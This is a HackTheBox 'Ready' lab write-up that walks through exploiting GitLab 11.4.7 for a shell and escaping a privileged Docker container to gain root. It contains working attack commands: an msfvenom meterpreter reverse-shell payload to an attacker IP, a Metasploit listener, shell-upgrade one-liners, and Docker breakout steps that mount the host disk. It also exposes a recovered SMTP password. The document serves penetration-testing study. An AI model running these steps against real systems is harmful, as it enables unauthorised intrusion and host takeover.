---
title: "HackTheBox: Ready Notes"
slug: rnw6fb
translationKey: rnw6fb
date: 2021-05-09T01:32:13+08:00
source: yuque/penetration
---

# Entry Point
Nmap

```http
http://10.10.10.220:5080/users/sign_in #GitLab Community Edition 11.4.7 (RCE)



```



How do you get the GitLab version? — According to [https://stackoverflow.com/questions/21068773/how-to-check-the-version-of-gitlab](https://stackoverflow.com/questions/21068773/how-to-check-the-version-of-gitlab), we know that:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620495231020-8a8b6bee-58cb-4933-be3d-3d6acee6c319.png)

Register a user, log in, and you can see the version

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620495290026-65ad4c65-978b-4ba6-96a6-9a08f5b13172.png)

Search for it, and there's an exploit:

[https://github.com/ctrlsam/GitLab-11.4.7-RCE/blob/master/exploit.py](https://github.com/ctrlsam/GitLab-11.4.7-RCE/blob/master/exploit.py)

Successfully got a shell as the git user

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620495309511-cb1acc0f-17f4-4f5b-acdb-524fc2ef05d9.png)

---

# Privilege Escalation
![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620497231561-8064a60f-a9e2-4526-a794-59ae90d9b6c7.png)

```yaml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
```

Digging further

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620497355234-5e06361c-8767-4558-bd1a-fe909485549d.png)



```basic
λ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=10.10.16.34 lport=443 -f elf  -o r_443.elf
D:/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-core-0.1.13/lib/rex/compat.rb:376: warning: Win32API is deprecated after Ruby 1.9.1; use fiddle directly instead
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: r_443.elf
```

Set up a listener

```basic
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) >
msf6 exploit(multi/handler) > set payload  linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost  10.10.16.34
lhost => 10.10.16.34
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > run
```

`YG65407Bjqvv9A0a8Tm_7w`

No ideas for now,,,



In the `/opt` directory, a global `grep -r -i pass` turned up the following:

```basic
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"	
```



By checking `/proc/1/cgroup`, I confirmed that the current environment is inside Docker, so I considered a docker escape approach (see [https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)):

> `cgroups` stands for "control groups". This is a Linux feature originally designed to isolate resource usage, and it also serves to isolate containers in Docker. You can tell whether you are inside a container by checking the control group of the init process at `/proc/1/cgroup`.
>
> (1) If you are not inside a container, the control group should be `/`, as shown on the right in the figure below
>
> (2) On the other hand, if you are inside a container, you should see `/docker/CONTAINER_ID`, as shown on the left in the figure below
>

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620541001268-058fb937-83f1-41bc-bfe7-255ed67ba9a2.png)

See: [https://funphishing.github.io/2021/01/17/HackTheBox-Ready/](https://funphishing.github.io/2021/01/17/HackTheBox-Ready/)



Privilege escalation successful!

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620533897189-a3308d61-5e4a-4482-a6a7-7f4fc3409e9b.png)

[This is a Yuque card, click the link to view](https://www.yuque.com/docs/44948535#I1oA6)

---

# Reflections
## Fast Scanning
```basic
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.220 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

nmap -p$ports -sC -sV -oA ready 10.10.10.220
```

But I think in real engagements, just running what's inside the parentheses is more practical:

```basic
nmap -p- --min-rate=1000 -T4 10.10.10.220 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//

```

## A Friendlier Shell
A generic shell upgrade:

```basic
script -c "/bin/bash -i" /dev/null

or

python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1620501473236-53296029-163b-47ce-8d33-a093cee1315f.png)



## Docker Escape Notes
### (1) Mounted docker socket
The Docker socket is mounted into the container, which allows the container to interact with the machine arbitrarily

See: [https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket)

```bash
# List images to use one
docker images
# Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# For other locations, use
-H unix:///path/to/docker.sock
```

Running `docker ps` is enough to tell

### (2) --privileged flag
> <font style="color:rgb(85, 85, 85);">This is probably the most classic docker escape. First, docker needs to run in privileged mode: when </font><font style="color:rgb(85, 85, 85);background-color:rgb(238, 238, 238);">docker run</font><font style="color:rgb(85, 85, 85);"> is given the </font>`<font style="color:rgb(85, 85, 85);background-color:rgb(238, 238, 238);">--privileged</font>`<font style="color:rgb(85, 85, 85);"> flag, the container gains root privileges on the host. Its biggest intended use in the design was probably to allow spawning containers inside that container. </font><u><font style="color:rgb(85, 85, 85);">Because of its privileges, this type of docker can see devices such as the disks on the host and allows remounting directories; use the </font></u><u><font style="color:rgb(85, 85, 85);background-color:rgb(238, 238, 238);">fdisk -l</font></u><u><font style="color:rgb(85, 85, 85);"> command to list disk files — a non-</font></u>`<u><font style="color:rgb(85, 85, 85);">privileged</font></u>`<u><font style="color:rgb(85, 85, 85);"> docker cannot see the disks.</font></u>
>

<font style="color:rgb(85, 85, 85);">Therefore, the most common escape technique for a privileged container is </font>**<font style="color:rgb(85, 85, 85);">mounting the host's root directory into the container</font>**<font style="color:rgb(85, 85, 85);">, gaining arbitrary file read/write on the host, and completing the escape by modifying files such as </font>`<font style="color:rgb(85, 85, 85);">crontab</font>`<font style="color:rgb(85, 85, 85);"> or root's </font>`<font style="color:rgb(85, 85, 85);">authorized_keys</font>`<font style="color:rgb(85, 85, 85);"></font>

```basic
# List disk files via the mounting command; a non-privileged docker cannot see the disks
fdisk -l
```

If running `fdisk -l` produces output, it is a `privileged` container; otherwise it is a non-`privileged` docker

Exploiting it is then very simple:

```basic
fdisk -l
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
cd /mnt/hola
Just modify the files...
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1621257473874-8571db15-9812-4e15-82ef-ecd9643aa752.png)

### (3) Container Capabilities — excessive container privileges
You can check currently container capabilities with:

```basic
capsh --print
```

if it has any of the following ones, you might be able to scape from it: 

**CAP_SYS_ADMIN**_,_**CAP_SYS_PTRACE**, **CAP_SYS_MODULE**, **DAC_READ_SEARCH**, **DAC_OVERRIDE**

```basic
CAP_SYS_ADMIN
CAP_SYS_PTRACE
CAP_SYS_MODULE
DAC_READ_SEARCH
DAC_OVERRIDE
```

Combine into a single command with grep:

```basic
capsh --print|grep -iE "CAP_SYS_ADMIN|CAP_SYS_PTRACE|CAP_SYS_MODULE|DAC_READ_SEARCH|DAC_OVERRIDE"

```

If there is no output, the container is not one with abused privileges.

Exploitation

First, analyze this command:

```basic
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab
```

It will print the physical location of the docker container on the host, for example:

```basic
root@e5871b579f57:/tmp# sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab

/var/lib/docker/overlay2/cfd00f89faf865bca3f8a2090d285c93a07c50ee2076cee71be98e08022cfcf8/diff
```



---

# Refs
+ [privilege-escalation/docker-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
+ [Docker SYS_ADMIN Container Escape Principle Analysis - FreeBuf](https://www.freebuf.com/vuls/264843.html)
+ [Docker escape](https://z3ratu1.github.io/Docker%20Escape.html)
